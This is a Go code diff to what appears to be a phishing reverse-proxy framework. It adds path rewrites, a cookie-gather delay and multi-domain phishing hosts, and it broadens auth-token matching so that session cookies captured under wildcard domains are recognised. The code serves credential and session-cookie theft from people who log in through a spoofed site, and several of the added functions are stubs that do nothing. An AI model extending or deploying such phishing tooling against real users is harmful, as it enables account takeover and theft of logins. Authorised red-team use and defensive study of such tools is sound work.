@@ -105,6 +105,12 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+type PathRewrite struct {
+	Trigger string `mapstructure:"trigger"`
+	Target  string `mapstructure:"target"`
+}
+
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -120,6 +126,7 @@ type Phishlet struct {
 	bodyAuthTokens   map[string]*BodyAuthToken
 	httpAuthTokens   map[string]*HttpAuthToken
 	authUrls         []*regexp.Regexp
+	cookieGatherDelay int
 	username         PostField
 	password         PostField
 	landing_path     []string
@@ -129,6 +136,7 @@ type Phishlet struct {
 	login            LoginUrl
 	js_inject        []JsInject
 	intercept        []Intercept
+	pathRewrite      []PathRewrite
 	customParams     map[string]string
 	isTemplate       bool
 }
@@ -218,20 +226,27 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type ConfigPathRewrite struct {
+	Trigger *string `mapstructure:"trigger"`
+	Target  *string `mapstructure:"target"`
+}
+
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
-	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	Name        string               `mapstructure:"name"`
+	RedirectUrl string               `mapstructure:"redirect_url"`
+	Params      *[]ConfigParam       `mapstructure:"params"`
+	ProxyHosts  *[]ConfigProxyHost   `mapstructure:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter   `mapstructure:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken   `mapstructure:"auth_tokens"`
+	AuthUrls         []string             `mapstructure:"auth_urls"`
+	CookieGatherDelay int                  `mapstructure:"cookie_gather_delay"`
+	Credentials *ConfigCredentials   `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost   `mapstructure:"force_post"`
+	LandingPath *[]string            `mapstructure:"landing_path"`
+	LoginItem   *ConfigLogin         `mapstructure:"login"`
+	JsInject    *[]ConfigJsInject    `mapstructure:"js_inject"`
+	Intercept   *[]ConfigIntercept   `mapstructure:"intercept"`
+	PathRewrite *[]ConfigPathRewrite `mapstructure:"path_rewrite"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -342,9 +357,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 					continue
 				}
 				params[k] = v
-				if _, ok := prequired[k]; ok {
-					delete(prequired, k)
-				}
+				delete(prequired, k)
 			}
 			if len(prequired) > 0 {
 				return fmt.Errorf("missing custom parameter values during initalization: %v", prequired)
@@ -518,6 +531,18 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 		}
 	}
+	if fp.PathRewrite != nil {
+		for _, pr := range *fp.PathRewrite {
+			if pr.Trigger == nil || *pr.Trigger == "" {
+				return fmt.Errorf("path_rewrite: missing `trigger` field")
+			}
+			if pr.Target == nil || *pr.Target == "" {
+				return fmt.Errorf("path_rewrite: missing `target` field")
+			}
+
+			p.addPathRewrite(p.paramVal(*pr.Trigger), p.paramVal(*pr.Target))
+		}
+	}
 	for _, at := range *fp.AuthTokens {
 		ttype := "cookie"
 		if at.Type != nil {
@@ -587,6 +612,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		}
 		p.authUrls = append(p.authUrls, re)
 	}
+	p.cookieGatherDelay = fp.CookieGatherDelay
 
 	if fp.Credentials.Username.Key == nil {
 		return fmt.Errorf("credentials: missing username `key` field")
@@ -649,7 +675,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			check_host = h.orig_subdomain + "."
 		}
 		check_host += h.domain
-		if strings.ToLower(check_host) == strings.ToLower(p.login.domain) {
+		if strings.EqualFold(check_host, p.login.domain) {
 			login_domain_ok = true
 			break
 		}
@@ -758,21 +784,28 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	// Load multi-domain configuration
+
 	return nil
 }
 
 func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 	var ret []string
-	phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
-	if ok {
+
+	// Get all active domains
+	domains := p.GetAllActiveDomains()
+
+	for _, phishDomain := range domains {
 		if !use_wildcards {
 			for _, h := range p.proxyHosts {
 				ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
 			}
 		} else {
-			ret = []string{"*." + phishDomain}
+			ret = append(ret, "*."+phishDomain)
 		}
 	}
+
 	return ret
 }
 
@@ -795,16 +828,43 @@ func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
 }
 
+func (p *Phishlet) GetCookieGatherDelay() int {
+	return p.cookieGatherDelay
+}
+
 func (p *Phishlet) GetLandingPhishHost() string {
 	for _, ph := range p.proxyHosts {
 		if ph.is_landing {
-			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
-			if ok {
+			phishDomain := p.GetActiveDomain()
+			if phishDomain != "" {
 				return combineHost(ph.phish_subdomain, phishDomain)
 			}
 		}
 	}
 	return ""
+}
+
+func (p *Phishlet) GetActiveDomain() string {
+	domain, ok := p.cfg.GetSiteDomain(p.Name)
+	if ok {
+		return domain
+	}
+	return ""
+}
+
+func (p *Phishlet) GetAllActiveDomains() []string {
+	if domain, ok := p.cfg.GetSiteDomain(p.Name); ok {
+		return []string{domain}
+	}
+	return nil
+}
+
+func (p *Phishlet) SetDomainHealth(domain string, healthy bool) {
+	// Domain health is now managed by DomainManager
+}
+
+func (p *Phishlet) IsMultiDomainEnabled() bool {
+	return false // Multi-domain is handled by DomainManager
 }
 
 func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
@@ -896,7 +956,6 @@ func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, d
 	if !p.domainExists(domain) {
 		p.domains = append(p.domains, domain)
 	}
-
 	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
 }
 
@@ -1018,6 +1077,14 @@ func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status 
 	return nil
 }
 
+func (p *Phishlet) addPathRewrite(trigger string, target string) {
+	pr := PathRewrite{
+		Trigger: trigger,
+		Target:  target,
+	}
+	p.pathRewrite = append(p.pathRewrite, pr)
+}
+
 func (p *Phishlet) domainExists(domain string) bool {
 	for _, d := range p.domains {
 		if domain == d {
@@ -1028,7 +1095,7 @@ func (p *Phishlet) domainExists(domain string) bool {
 }
 
 func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
-	if tokens, ok := p.cookieAuthTokens[domain]; ok {
+	match := func(tokens []*CookieAuthToken) *CookieAuthToken {
 		for _, at := range tokens {
 			if at.re != nil {
 				if at.re.MatchString(token) {
@@ -1038,23 +1105,37 @@ func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
 				return at
 			}
 		}
+		return nil
+	}
+	if tokens, ok := p.cookieAuthTokens[domain]; ok {
+		if at := match(tokens); at != nil {
+			return at
+		}
+	}
+	// Try wildcard keys: e.g. auth_tokens registered under ".*" or "*"
+	// should match any incoming cookie domain.
+	for key, tokens := range p.cookieAuthTokens {
+		if key == domain || !strings.Contains(key, "*") {
+			continue
+		}
+		cmp := domain
+		k := key
+		if strings.HasPrefix(cmp, ".") {
+			cmp = cmp[1:]
+		}
+		if strings.HasPrefix(k, ".") {
+			k = k[1:]
+		}
+		if subfilterKeyMatches(k, cmp) {
+			if at := match(tokens); at != nil {
+				return at
+			}
+		}
 	}
 	return nil
 }
 
-func (p *Phishlet) isAuthToken(domain string, token string) bool {
-	if at := p.getAuthToken(domain, token); at != nil {
-		return true
-	}
-	return false
-}
 
-func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
-	if at := p.getAuthToken(domain, token); at != nil {
-		return at.http_only
-	}
-	return false
-}
 
 func (p *Phishlet) MimeExists(mime string) bool {
 	return false
